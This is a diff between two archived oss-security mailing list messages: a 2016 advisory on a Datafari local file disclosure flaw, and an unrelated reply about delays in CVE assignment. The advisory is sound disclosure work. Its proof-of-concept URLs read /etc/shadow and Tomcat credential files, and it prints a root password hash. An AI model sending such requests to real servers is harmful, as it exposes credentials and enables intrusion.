@@ -1,84 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/24/14
-Message-ID: <CANTwUcqY-UXW+M-=urTkqtQLMQ5S6aG+kRKUdP02whyStXrQPQ@mail.gmail.com>
-Date: Wed, 24 Feb 2016 10:00:57 -0500
-From: Fried Wil <wilfried.pascault@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/09/7
+Message-ID: <CALPTtNWU0mG2XOphpRXQGUeLsvGe1N-etNFtVBdDWONAoT7RtA@mail.gmail.com>
+Date: Wed, 9 Mar 2016 11:07:19 -0800
+From: Reed Loden <reed@...dloden.com>
 To: oss-security@...ts.openwall.com
-Cc: CVE Assignments MITRE <cve-assign@...re.org>
-Subject: Re: CVE Request: Datafari Local File Disclosure
+Cc: kseifried <kseifried@...hat.com>
+Subject: Re: Concerns about CVE coverage shrinking - direct impact to researchers/companies
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Issued to some people, perhaps, but there are plenty of examples of MITRE
+not issuing CVEs even after multiple months and pokes. Understand MITRE is
+resource constrained, but they are blocking new CNAs as well, which doesn't
+help.
 
-I forgot to add MITRE in cc for CVE assignment.
+Just check out the board list archives (
+https://cve.mitre.org/data/board/archives/). MITRE isn't responding at all
+to people's concerns.
 
-Thanks
+~reed
 
-On Wed, Feb 3, 2016 at 10:55 AM, PASCAULT Wilfried <wpascault@...si.com> wrote:
-> Datafari, an Open source enterprise search software using Apache Solr, ManifoldCF and Tomcat is proned to a local file disclosure vulnerability.
->
-> Product's information
-> ---------------------
-> * Name : Datafari - http://www.datafari.com/
-> * Editor: France Labs
-> * Affected versions: 2.x<2.1.3
-> * Tested : 2.1.0 and 2.1.1 on Debian Wheezy 7 and Jesse 8
->
-> Description
-> -----------
-> When "filesystem" repository has been configured into Datafari (administrative privileges on Datafari required), a user could access to any file of the system with root privileges.
->
-> On "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" configuration file, "ALLOWLOCALFILEREADING" parameter allows by default to read file on system.
->
-> Datafari is by default running as user root, so any file could be downloaded with "url=file:/" parameter in "/Datafari/URL" (token isn't checked).
->
-> This issue is exploitable only when "Filesystem" repository has been set on ManifoldCF.
->
-> Proof of concept
-> ----------------
-> http://localhost:8080/Datafari/URL?url=file:/arbitrary_file
->
-> http://localhost:8080/Datafari/URL?url=file:/etc/shadow
-> => file will be downloaded as _etc_shadow
->
-> $ head _etc_shadow
-> root:$6$nTTh32TT$rLqcSGDf92tyh9aXtuTqnlGW4Ewr.IzBEcdP/kMnvhNYELz7iUgmOyiWesbJRUwEeKdKk/2yQcnAVBQYBGsiD.:16714:0:99999:7:::
-> daemon:*:16714:0:99999:7:::
-> bin:*:16714:0:99999:7:::
-> sys:*:16714:0:99999:7:::
-> sync:*:16714:0:99999:7:::
-> games:*:16714:0:99999:7:::
-> man:*:16714:0:99999:7:::
-> lp:*:16714:0:99999:7:::
-> mail:*:16714:0:99999:7:::
-> news:*:16714:0:99999:7:::
->
-> another funny file ^_^ (Tomcat manager password could not be changed during installation)
-> http://localhost:8080/Datafari/URL?url=file://opt/datafari/tomcat/conf/tomcat-users.xml
-> $ cat _opt_datafari_tomcat_conf_tomcat-users.xml|grep admin
->   <user password="@PASSWORD@" roles="manager-gui,SearchAdministrator" username="admin"/>
->
-> http://localhost:8080/manager/html/list
->
->
-> Workaround
-> ----------
-> Set "ALLOWLOCALFILEREADING=false" on "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" and restart Datafari
->
-> Timeline
-> --------
-> 1/6/2016: reported to vendor
-> 1/11/2016: vendor response but said was not a security issue
-> 1/11/2016: add technical details and POC
-> 1/11/2016: vendor acknowledged as a security issue
-> 1/11/2016: patch was commited in master branch
-> 1/28/2016: 2.1.3 released
->
-> Thanks to Cédric and Aurélien from Datafari project for their quick replies.
+On Wed, Mar 9, 2016 at 11:04 AM, David A. Wheeler <dwheeler@...eeler.com>
+wrote:
 
+> All - I've chatted with some of the people who fund the CVE work at MITRE.
+> I've learned that CVEs *are* being issued, but obviously that is happening
+> too slowly.
+>
+> They're having a meeting tomorrow (March 10) to try to figure out what
+> the problems are and how to fix it.  I don't know what they'll do.
+> However, I'm hopeful that  this will mean that the CVE work will get
+> back on track soon.
+>
+> --- David A. Wheeler
+>
 
-
--- 
-Wilfried Pascault
-+1 514 430 7201
-wilfried.pascault@...il.com
